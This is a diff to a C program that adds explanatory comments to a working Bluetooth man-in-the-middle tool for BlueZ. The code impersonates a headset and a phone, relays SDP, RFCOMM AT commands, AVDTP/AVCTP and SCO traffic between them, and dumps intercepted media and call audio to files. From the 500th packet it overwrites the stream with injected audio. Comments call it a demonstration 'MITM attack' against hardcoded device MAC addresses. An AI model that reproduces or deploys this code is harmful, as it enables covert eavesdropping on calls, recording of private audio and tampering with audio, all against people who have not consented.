@@ -128,14 +128,15 @@ uint8_t sdp_lookup_uuid_rfcomm_channel(bdaddr_t *addr, uint16_t wanted_uuid)
 void main()
 {
 	// ------ Pairing stuff ------
+	// These are some known MACs for devices we'll be using in the demonstration 
 	// "00:11:67:F8:8A:D1" - JAM Headphones
 	// "FC:58:FA:3A:49:08" - Perchik's bluetooth speaker
 		// Dongel - "00:01:95:27:45:51"
 	// Shay mac - 60:F8:1D:C0:95:15 
 
-	const char* dest1_mac = "FC:58:FA:3A:49:08";
-	const char* dest2_mac = "78:D7:5F:A2:7E:4A";
-	const char* local_mac = "60:F8:1D:C0:95:15";
+	const char* dest1_mac = "FC:58:FA:3A:49:08"; // Audio Sink
+	const char* dest2_mac = "78:D7:5F:A2:7E:4A"; // Audio Gateway
+	const char* local_mac = "60:F8:1D:C0:95:15"; // Local Controller
 
 	bdaddr_t bdaddr1, bdaddr2;
 	int dev_id = 0, dev_sock = 0, err, attempts;
@@ -145,7 +146,7 @@ void main()
 	struct hci_conn_info_req *conn_info_request;
 	struct hci_dev_info dev_info;
 
-	// SDP stuff
+	// SDP stuff - use these for SDP querying for RFCOMM channels with sdp_lookup_uuid_rfcomm_channel below
 	uint16_t headset_uuid16 = 0x1108;
 	uint16_t headset_gate_uuid16 = 0x1112;
 	uint16_t hfp_gate_uuid16 = 0x111F;
@@ -160,7 +161,7 @@ void main()
 	struct sco_options sco_conn_options;
 	wanted_rfcomm_sock_res server_rfcomm_sock;
 	socklen_t optlen;
-	// RFCOMM Channels:
+	// RFCOMM Channels for known demonstration devices:
 	// iPhone: 8
 	// JAM Headphones: 1
 	// Perchik speakers: 3
@@ -189,7 +190,9 @@ void main()
 
 	printf("Looking up device RFCOMM channels...\n");
 
-	// Find RFCOMM channels on both devices
+	// Find RFCOMM channels on both devices - uncomment to discover channels for new devices
+	// WARNING: Set a return after these functions or Ctrl+C the program after SDP querying is over. 
+	// Do not continue to the MITM attack after a SDP query! It simply won't work.
 	//rfcomm_channel1 = sdp_lookup_uuid_rfcomm_channel(&bdaddr1, hfp_uuid16);
 	//rfcomm_channel2 = sdp_lookup_uuid_rfcomm_channel(&bdaddr2, hfp_gate_uuid16);
 
@@ -399,10 +402,12 @@ void main()
 */
 	//start_sco_conn_wait(&sco_sock2);
 
+	// Bind a L2CAP socket to wait for the slave to probe our SDP server
 	sdp_sock_res.psm = PSM_SDP;
 	sdp_sock_res.res_sock = -1;
 	start_l2cap_conn_wait(&sdp_sock_res);
 
+	// Bind two L2CAP sockets to wait for the slave to connect to our AVDTP and AVCTP service ports
 	server_avctp_sock_res.psm = PSM_AVCTP;
 	server_avdtp_sock_res.psm = PSM_AVDTP;
 
@@ -501,6 +506,8 @@ void main()
 
 	ag2hs = hs2ag = NULL;
 
+	// Split into master and slave processes. This is because of bugs in BlueZ with connecting two sockets of the same kind
+	// within the same process. Particularly A2DP and SCO.
 	if (fork())
 	{
 		is_server = 1;
@@ -629,12 +636,14 @@ void main()
 	{
 	if (is_server)
 	{
+		// On first run, set a SCO socket to wait for the audio gateway to initiate a phone call
 		if (-2 == sco_sock2)
 		{
 			sco_sock2 = -1;
 			start_sco_conn_wait(&sco_sock2);
 		}
 
+		// Check if our SDP server has been connected to
 		if (sdp_sock_res.res_sock != -1)
 		{
 			printf("We have been SDP queried! - %d\n", sdp_sock_res.res_sock);
@@ -649,8 +658,10 @@ void main()
 			server_rfcomm_sock.res_sock = -1;
 		}*/
 
+		// Read +AT commands from master
 		if ((recv_len = recv(rfcomm_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 		{
+			// Forward it to the slave
 			//send(rfcomm_sock2, recv_buf, recv_len, 0);
 			if (write(ag2hs, recv_buf, recv_len) < 0) printf("write failed\n");
 
@@ -659,6 +670,7 @@ void main()
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}	
 
+		// Check for pending slave +AT commands
 		if ((recv_len = read(hs2ag, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("HS2AG: %s\n", recv_buf);
@@ -667,24 +679,30 @@ void main()
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
+		// Check for pending SDP messages from slave
 		if ((recv_len = read(hs2ag_sdp, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("HS2AG_SDP: %d bytes\n", recv_len);
 
+			// Forward to master
 			if (send(sdp_sock2, recv_buf, recv_len, 0) < 0) printf("sdp_sock2 send failed\n");
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
 		if (-1 != sdp_sock2)
 		{
+			// Test to see if the master sent any SDP data
 			if ((recv_len = recv(sdp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("SDP2->SDP1: %d bytes\n", recv_len);
+				
+				// Send to slave process
 				write(ag2hs_sdp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// If the master initiated a A2DP control connection
 		if (server_avctp_sock_res.res_sock != -1 && -1 == avctp_sock2)
 		{
 			//close(sdp_sock2);
@@ -695,25 +713,33 @@ void main()
 
 		if (-1 != avctp_sock2)
 		{
+			// Receive AVCTP data from master
 			if ((recv_len = recv(avctp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("AVCTP2->AVCTP1 [%d bytes]\n", recv_len);
+				
+				// Send to slave process to be forwarded
 				write(ag2hs_avctp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 
+			// Check for pending AVCTP data from slave process
 			if ((recv_len = read(hs2ag_avctp, recv_buf, RECV_BUF_SIZE)) > 0)
 			{
 				printf("HS2AG_AVCTP: %d bytes\n", recv_len);
 
+				// Send to master
 				if (send(avctp_sock2, recv_buf, recv_len, 0) < 0) printf("avctp_sock2 send failed\n");
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// If the master initiated a A2DP distribution connection
 		if (server_avdtp_sock_res.res_sock != -1 && -1 == avdtp_sock2)
 		{
 			printf("AG initiated AVDTP channel!\n");
+			
+			// Save the result socket
 			avdtp_sock2 = server_avdtp_sock_res.res_sock;
 			server_avdtp_sock_res.res_sock = -2;
 			sleep(1);
@@ -726,27 +752,35 @@ void main()
 				server_avdtp_sock_res.res_sock = -1;
 				server_avdtp_sock_res.psm = PSM_AVDTP;
 
+				// Wait for the actual data connection over L2CAP
 				start_l2cap_conn_wait(&server_avdtp_sock_res);
 			}
 
 			if (server_avdtp_sock_res.res_sock != -1)
 			{
 				printf("AVDTP Audio channel opened!\n");
+				
+				// Audio socket has been opened!
 				audio_sock2 = server_avdtp_sock_res.res_sock;
 				server_avdtp_sock_res.res_sock = -1;
 			}
 
+			// Test for data on master AVDTP channel
 			if ((recv_len = recv(avdtp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("AVDTP2->AVDTP1 [%d bytes]\n", recv_len);
+				
+				// Send to slave process
 				write(ag2hs_avdtp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 
+			// Test for pending slave AVDTP data
 			if ((recv_len = read(hs2ag_avdtp, recv_buf, RECV_BUF_SIZE)) > 0)
 			{
 				//printf("HS2AG_AVDTP: %d bytes\n", recv_len);
 
+				// Send to master
 				if (send(avdtp_sock2, recv_buf, recv_len, 0) < 0) printf("avdtp_sock2 send failed\n");
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
@@ -754,50 +788,67 @@ void main()
 
 		if (-1 != audio_sock2)
 		{
+			// 608 is the magic MTU for our controller... adjust accordingly
+			// Test for audio data from master
 			if ((recv_len = recv(audio_sock2, recv_buf, 608, 0)) > 0)
 			{
 				//printf("AUDIO2->AUDIO1 [%d bytes]\n", recv_len);
+				
+				// Record to file in SBC format
 				if (NULL == test_audio_file) test_audio_file = fopen("audiodump.sbc", "wb");
 				fwrite(recv_buf+12, 1, recv_len-12, test_audio_file);
 				/*printf("AUDPKT RTP: %02x %02x %d %d %08x\n", recv_buf[0], recv_buf[1], END_FLIP16(*((uint16_t*)&recv_buf[2])), END_FLIP32(*((uint32_t*)&recv_buf[4])), *((uint32_t*)&recv_buf[8]));*/
 				int sequence = END_FLIP16(*((uint16_t*)&recv_buf[2]));
+				
+				// Check packet sequence number, start overwriting audio with our audio from the 500th packet
 				if (sequence > 500 && 1)
 				{
 					int rb = fread(recv_buf+12, 1, recv_len - 12, haxed_audio_file);
 					printf("Injected %d bytes into stream! %02x%02x%02x%02x\n", rb, recv_buf[16], recv_buf[17], recv_buf[18], recv_buf[19]);
 				}
 
+				// Send audio packet to slave process
 				if (write(ag2hs_audio, recv_buf, recv_len) < 0) printf("Failed to write to ag2hs_audio[err %u - %s]\n", errno, strerror(errno));
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 				usleep(1);
 			}
 
+			// Test for pending audio data from slave process
 			if ((recv_len = read(hs2ag_audio, recv_buf, RECV_BUF_SIZE)) > 0)
 			{
 				//printf("HS2AG_AUDIO: %d bytes\n", recv_len);
 
+				// Send to master
 				if (send(audio_sock2, recv_buf, recv_len, 0) < 0) printf("avctp_sock2 send failed\n");
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// If the master has an open SCO connection
 		if (0 < sco_sock2)
 		{
+			// Test for SCO data from master
 			if ((recv_len = recv(sco_sock2, recv_buf, DEFAULT_SCO_MTU, 0)) > 0)
 			{
 				printf("SCO2->SCO1 [%u bytes]\n", recv_len);
+				
+				// Forward SCO audio data to slave process
 				if (write(ag2hs_sco, recv_buf, recv_len) < 0) printf("ag2hs_sco write failed\n");
 			
+				// Dump SCO audio to raw PCM file
 				if (NULL == test_audio_file) test_audio_file = fopen("test.pcm", "wb");
 				fwrite(recv_buf, 1, recv_len, test_audio_file);
 
 				memset(recv_buf, 0, RECV_BUF_SIZE); 
 			}
 			
+			// Test for pending SCO data from slave process
 			if ((recv_len = read(hs2ag_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
 			{
 				printf("HS2AG_SCO: %u bytes to SCO!\n", recv_len);
 				//printf("^");
+				
+				// Forward data to master - send as fragmented chunks if necessary
 				if (recv_len <= DEFAULT_SCO_MTU)
 				{
 					if (err = send(sco_sock2, recv_buf, recv_len, 0) < 0) printf("sco2 send failed (%d - %s) [%d bytes]\n", errno, strerror(errno), recv_len);
@@ -815,6 +866,7 @@ void main()
 	}
 	else
 	{
+		// Test for pending AVCTP data from master process
 		if ((recv_len = read(ag2hs_avctp, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("AG2HS_AVCTP: %d bytes\n", recv_len);
@@ -822,30 +874,38 @@ void main()
 			if (-1 == avctp_sock1)
 			{
 				//close(sdp_sock1);
+				// Master initiated a AVCTP channel to us, open a channel from us to the slave
 				avctp_sock1 = connect_l2cap(dest1_mac, PSM_AVCTP, NULL, NULL);
 			}
 		
+			// Forward master's data to slave
 			if (send(avctp_sock1, recv_buf, recv_len, 0) < 0) printf("avctp_sock1 send failed\n");
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
 		if (-1 != avctp_sock1)
 		{
+			// Test for AVCTP data from slave
 			if ((recv_len = recv(avctp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("AVCTP1->AVCTP2: %d bytes\n", recv_len);
+				
+				// Send to master process
 				write(hs2ag_avctp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// Test for pending AVDTP data from master
 		if ((recv_len = read(ag2hs_avdtp, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("AG2HS_AVDTP: %d bytes\n", recv_len);
 
+			// Master initiated a AVDTP channel, open a channel from us to the slave
 			if (-1 == avdtp_sock1)
 				avdtp_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP, NULL, NULL);
 		
+			// Forward master's data to slave
 			if (send(avdtp_sock1, recv_buf, recv_len, 0) < 0) printf("avdtp_sock1 send failed\n");
 
 			memset(recv_buf, 0, RECV_BUF_SIZE);
@@ -853,14 +913,20 @@ void main()
 
 		if (-1 != avdtp_sock1)
 		{
+			// Test for AVDTP data from slave
 			if ((recv_len = recv(avdtp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("AVDTP1->AVDTP2: %d bytes\n", recv_len);
+				
+				// Forward AVDTP data to master process
 				write(hs2ag_avdtp, recv_buf, recv_len);
 			
+				// Check the AVDTP packet to see if it's the A2DP audio channel initialization message
 				if (detect_avdtp_start_accept_msg(recv_buf, recv_len))
 				{
 					printf("Detected START ACCEPT message!\n");
+					
+					// Found an A2DP audio channel ready for connect message, assume the master's role and connect over L2CAP
 					audio_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP, &audio_sock1_omtu, &audio_sock1_imtu);
 					if (audio_sock1_omtu > DEFAULT_L2CAP_MTU && 0)
 					{
@@ -874,17 +940,23 @@ void main()
 			}
 		}
 
+		// Check for +AT commands from slave
 		if ((recv_len = recv(rfcomm_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 		{
 			printf("RFCOMM1 -> RFCOMM2: %s\n", recv_buf);
+			
+			// Forward +AT command to master process
 			write(hs2ag, recv_buf, recv_len);
 			//send(rfcomm_sock1, recv_buf, recv_len, 0);
 
+			// Check for the AT command that usually shows up when a SCO connection is opened...
 			if (NULL != strcasestr(recv_buf, "CLCC") && 0)
 			{
 				if (-1 == sco_sock1)
 				{
 					printf("Tiem to open conn to headset!\n");
+				
+					// Open the SCO connection to the slave
 					sco_sock1 = connect_sco(dest1_mac, local_mac);
 
 					memset(&sco_conn_options, 0, sizeof(struct sco_options));
@@ -909,6 +981,7 @@ void main()
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}	
 
+		// MTU is 612, so read 608 bytes of payload as 4 bytes are A2DP header bytes
 		// 612 - 4b header
 		if ((recv_len = read(ag2hs_audio, recv_buf, 608)) > 0)
 		{
@@ -926,6 +999,7 @@ void main()
 
 			if (recv_len <= audio_sock1_omtu)
 			{
+				// Many times if we sent over the MTU or send too quickly the buffer fills up, need to watch this
 				if ((err = send(audio_sock1, recv_buf, recv_len, 0)) < 0) 
 				{
 					if (errno != EAGAIN && errno != EWOULDBLOCK)
@@ -953,52 +1027,67 @@ void main()
 
 		if (-1 != audio_sock1)
 		{
+			// Test for pending audio data from slavd
 			if ((recv_len = recv(audio_sock1, recv_buf, audio_sock1_imtu, 0)) > 0)
 			{
 				//printf("AUDIO1->AUDIO2: %d bytes\n", recv_len);
+				
+				// Forward A2DP audio data to master process
 				write(hs2ag_audio, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// Test for SDP queries from master process
 		if ((recv_len = read(ag2hs_sdp, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("AG2HS_SDP: %d bytes\n", recv_len);
 
+			// Connect to slave's SDP service, pretending to be the master
 			if (-1 == sdp_sock1)
 				sdp_sock1 = connect_l2cap(dest1_mac, PSM_SDP, &sdp1_omtu, &sdp1_imtu);
 
+			// Send master's request
 			if (send(sdp_sock1, recv_buf, recv_len, 0) < 0) printf("sdp_sock1 send failed\n");
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
 		if (-1 != sdp_sock1)
 		{
+			// Test for pending SDP responses from slave
 			if ((recv_len = recv(sdp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
 			{
 				printf("SDP1->SDP2: %d bytes\n", recv_len);
+				
+				// Forward SDP reply to master process
 				write(hs2ag_sdp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
 			}
 		}
 
+		// Test for pending AT commands from master process
 		if ((recv_len = read(ag2hs, recv_buf, RECV_BUF_SIZE)) > 0)
 		{
 			printf("AG2HS: %s\n", recv_buf);
 
+			// Connect to target profile RFCOMM channel on slave, pretending to be the master
 			if (-1 == rfcomm_sock1)
 			{
 				rfcomm_sock1 = connect_rfcomm(dest1_mac, local_mac, rfcomm_channel1);
 				printf("Opened HS RFCOMM connection\n");
 			}
 
+			// Forward AT commands from master to slave
 			if (send(rfcomm_sock1, recv_buf, recv_len, 0) < 0) printf("rfcomm_sock1 send failed\n");
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
+		// Test for pending SCO audio data from master
 		if ((recv_len = read(ag2hs_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
 		{
 //				printf("AG2HS_SCO: %u bytes to SCO!\n", recv_len);
+
+			// Open SCO connection to slave, assuming role of master
 			if (-1 == sco_sock1)
 			{
 				printf("Connecting SCO to headset!\n");
@@ -1015,6 +1104,7 @@ void main()
 				printf("SCO Link1 mtu: %u\n", sco_conn_options.mtu);
 			}
 
+			// Send SCO data chunks to slave, fragmented if needed
 			if (recv_len <= DEFAULT_SCO_MTU)
 			{
 				if (send(sco_sock1, recv_buf, recv_len, 0) < 0) 
@@ -1036,9 +1126,12 @@ void main()
 
 		if (-1 != sco_sock1)
 		{
+			// Test for pending SCO audio data from slave
 			if ((recv_len = recv(sco_sock1, recv_buf, DEFAULT_SCO_MTU, 0)) > 0)
 			{
 				printf("SCO1->SCO2 [%u bytes]\n", recv_len);
+				
+				// Forward SCO audio data to master process
 				if (write(hs2ag_sco, recv_buf, recv_len) < 0) printf("hs2ag_sco write failed\n");
 
 				memset(recv_buf, 0, RECV_BUF_SIZE); 
@@ -1047,6 +1140,7 @@ void main()
 	}
 	}
 
+	// TODO: Remove this entire chunk of code
 	while(1)
 	{
 /*
